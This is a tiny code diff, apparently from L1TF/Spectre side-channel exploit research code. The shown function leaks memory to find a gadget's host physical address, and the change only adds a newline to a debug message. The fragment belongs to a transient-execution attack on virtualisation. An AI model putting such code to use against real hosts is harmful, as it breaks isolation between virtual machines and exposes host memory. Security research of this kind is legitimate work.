@@ -1020,7 +1020,7 @@ uintptr_t l1tf_find_base(void)
         spectre_touch_base_stop();
         l1tf_leak_buffer_modify(&leak_addr, leak_addr.original_pfn << 12);
         l1tf_test_base(pa, 100000);
-        pr_dub("\nFound gadget's base at hpa %lx.\n", pa);
+        pr_dub("\nFound gadget's base at hpa %lx.\n\n", pa);
         return pa;
       }
     }
